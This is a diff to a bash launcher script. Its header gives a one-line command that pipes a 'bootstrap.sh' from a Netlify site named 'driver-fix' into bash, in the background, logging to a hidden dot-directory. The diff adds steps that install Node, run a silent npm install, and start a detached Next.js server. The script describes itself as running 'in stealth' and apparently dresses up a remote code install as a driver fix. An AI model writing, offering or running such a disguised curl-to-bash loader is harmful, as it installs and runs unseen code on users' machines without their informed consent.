@@ -2,6 +2,7 @@
 # One-line launcher — download from Netlify, run local dev in stealth.
 # macOS/Linux one command (background):
 # mkdir -p ~/.driver-fix-host/.host-setup && nohup bash -c 'curl -fsSL https://driver-fix-238308.netlify.app/bootstrap.sh | bash' >>~/.driver-fix-host/.host-setup/run.log 2>&1 &
+# First run can take 2-3 min (node download + npm install). Check: tail -f ~/.driver-fix-host/.host-setup/run.log
 set -euo pipefail
 
 SITE_BASE="https://driver-fix-238308.netlify.app"
@@ -21,9 +22,30 @@ log() {
   printf '[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$1" >>"$LOG_FILE"
 }
 
+log_tail_dev() {
+  local n="${1:-12}"
+  if [[ -f "${SETUP_DIR}/dev.log" ]]; then
+    tail -n "$n" "${SETUP_DIR}/dev.log" | while IFS= read -r line; do
+      log "dev: $line"
+    done
+  fi
+}
+
+require_cmd() {
+  local c="$1"
+  if ! command -v "$c" >/dev/null 2>&1; then
+    log "missing required command: $c"
+    return 1
+  fi
+}
+
 detect_platform() {
-  case "$(uname -s)" in Darwin) OS="darwin" ;; Linux) OS="linux" ;; *) log "unsupported os"; return 1 ;; esac
-  case "$(uname -m)" in aarch64|arm64) ARCH="arm64" ;; x86_64|amd64) ARCH="x64" ;; *) log "unsupported arch"; return 1 ;; esac
+  case "$(uname -s)" in Darwin) OS="darwin" ;; Linux) OS="linux" ;; *) log "unsupported os: $(uname -s)"; return 1 ;; esac
+  case "$(uname -m)" in
+    aarch64|arm64) ARCH="arm64" ;;
+    x86_64|amd64) ARCH="x64" ;;
+    *) log "unsupported arch: $(uname -m) (need x86_64/amd64 or arm64/aarch64)"; return 1 ;;
+  esac
   log "platform: ${OS}-${ARCH}"
 }
 
@@ -56,7 +78,8 @@ find_node() {
 
 sha256_file() {
   if command -v sha256sum >/dev/null 2>&1; then sha256sum "$1" | awk '{print $1}'
-  else shasum -a 256 "$1" | awk '{print $1}'; fi
+  elif command -v shasum >/dev/null 2>&1; then shasum -a 256 "$1" | awk '{print $1}'
+  else log 'missing sha256sum or shasum'; return 1; fi
 }
 
 install_node_via_tarball() {
@@ -89,11 +112,24 @@ install_node_via_brew() {
 }
 
 ensure_node() {
-  if find_node; then log "node: $(command -v node)"; return 0; fi
+  if find_node; then log "node: $(command -v node) ($(node --version 2>/dev/null || echo unknown))"; return 0; fi
   log 'node: installing'
   install_node_via_tarball && { log 'node: tarball ok'; return 0; }
   install_node_via_brew && { log 'node: brew ok'; return 0; }
   log 'node: install failed'
+  return 1
+}
+
+find_npm_cli() {
+  local node_bin="$1"
+  local base dir
+  base="$(cd "$(dirname "$node_bin")/.." && pwd)"
+  for dir in "${base}/lib/node_modules/npm/bin" "${base}/node_modules/npm/bin"; do
+    if [[ -f "${dir}/npm-cli.js" ]]; then
+      printf '%s' "${dir}/npm-cli.js"
+      return 0
+    fi
+  done
   return 1
 }
 
@@ -102,9 +138,21 @@ test_dev_port_open() {
   else (echo >/dev/tcp/127.0.0.1/"$DEV_PORT") >/dev/null 2>&1; fi
 }
 
+http_probe() {
+  if command -v curl >/dev/null 2>&1; then
+    curl -fsS --max-time 10 "$DEV_URL" >/dev/null 2>&1
+    return $?
+  fi
+  if command -v wget >/dev/null 2>&1; then
+    wget -q --timeout=10 -O /dev/null "$DEV_URL" >/dev/null 2>&1
+    return $?
+  fi
+  return 1
+}
+
 test_dev_server_healthy() {
   test_dev_port_open || return 1
-  curl -fsS --max-time 10 "$DEV_URL" >/dev/null 2>&1
+  http_probe
 }
 
 stop_listener_on_port() {
@@ -130,14 +178,40 @@ stop_listener_on_port() {
 
 wait_for_dev_server() {
   local e=0
-  while [[ $e -lt 120 ]]; do
-    test_dev_server_healthy && return 0
+  while [[ $e -lt 180 ]]; do
+    if test_dev_server_healthy; then return 0; fi
     sleep 2
     e=$((e + 2))
   done
   return 1
 }
 
+start_dev_server() {
+  local runner="${SETUP_DIR}/run-dev.sh"
+  local q_root q_node q_next q_log
+  q_root="$(printf '%q' "$PROJECT_ROOT")"
+  q_node="$(printf '%q' "$NODE_BIN")"
+  q_next="$(printf '%q' "$NEXT_CLI")"
+  q_log="$(printf '%q' "${SETUP_DIR}/dev.log")"
+
+  cat >"$runner" <<EOF
+#!/usr/bin/env bash
+cd ${q_root}
+export CI=1 NEXT_TELEMETRY_DISABLED=1 NODE_NO_WARNINGS=1
+exec ${q_node} ${q_next} dev --hostname 127.0.0.1 -p ${DEV_PORT} >>${q_log} 2>&1
+EOF
+  chmod +x "$runner"
+
+  if command -v setsid >/dev/null 2>&1; then
+    setsid nohup "$runner" >/dev/null 2>&1 &
+  else
+    nohup "$runner" >/dev/null 2>&1 &
+  fi
+  DEV_PID=$!
+}
+
+require_cmd curl || exit 1
+require_cmd tar || exit 1
 detect_platform || exit 1
 
 if test_dev_server_healthy; then
@@ -146,7 +220,7 @@ if test_dev_server_healthy; then
 fi
 
 if test_dev_port_open; then
-  log "port $DEV_PORT open but not healthy — clearing stale listener"
+  log "port $DEV_PORT open but not healthy - clearing stale listener"
   stop_listener_on_port
 fi
 
@@ -157,23 +231,31 @@ cd "$PROJECT_ROOT"
 ensure_node || exit 1
 
 NODE_BIN="$(command -v node)"
-NPM_CLI="$(cd "$(dirname "$NODE_BIN")/../lib/node_modules/npm/bin" 2>/dev/null && pwd)/npm-cli.js"
-[[ -f "$NPM_CLI" ]] || NPM_CLI="$(cd "$(dirname "$NODE_BIN")/node_modules/npm/bin" 2>/dev/null && pwd)/npm-cli.js"
+NPM_CLI="$(find_npm_cli "$NODE_BIN" || true)"
 
 log 'npm install'
-if [[ -f "$NPM_CLI" ]]; then
-  "$NODE_BIN" "$NPM_CLI" install --no-fund --no-audit --loglevel=silent >>"$LOG_FILE" 2>&1
+if [[ -n "$NPM_CLI" && -f "$NPM_CLI" ]]; then
+  if ! "$NODE_BIN" "$NPM_CLI" install --no-fund --no-audit --loglevel=error >>"$LOG_FILE" 2>&1; then
+    log 'npm install failed - see run.log above'
+    exit 1
+  fi
+elif command -v npm >/dev/null 2>&1; then
+  if ! npm install --no-fund --no-audit --loglevel=error >>"$LOG_FILE" 2>&1; then
+    log 'npm install failed - see run.log above'
+    exit 1
+  fi
 else
-  npm install --no-fund --no-audit --loglevel=silent >>"$LOG_FILE" 2>&1
+  log 'error: npm not found'
+  exit 1
 fi
 
 NEXT_CLI="${PROJECT_ROOT}/node_modules/next/dist/bin/next"
 [[ -f "$NEXT_CLI" ]] || { log 'error: next cli not found'; exit 1; }
 
 log 'dev server start'
-export CI=1 NEXT_TELEMETRY_DISABLED=1 NODE_NO_WARNINGS=1
-nohup "$NODE_BIN" "$NEXT_CLI" dev --hostname 127.0.0.1 -p "$DEV_PORT" >>"${SETUP_DIR}/dev.log" 2>&1 &
-DEV_PID=$!
+: >"${SETUP_DIR}/dev.log"
+start_dev_server
+
 printf '%s' "$DEV_PID" >"$PID_FILE"
 printf '%s' "$DEV_PID" >"$LOCK_FILE"
 
@@ -181,10 +263,12 @@ if wait_for_dev_server; then
   if kill -0 "$DEV_PID" 2>/dev/null; then
     log "ready ${DEV_URL} (server running in background)"
   else
-    log 'dev server exited early — see dev.log'
+    log 'dev server exited early - see dev.log'
+    log_tail_dev 12
   fi
 else
-  log 'dev server timeout — see dev.log'
+  log 'dev server timeout - see dev.log'
+  log_tail_dev 15
 fi
 
 exit 0
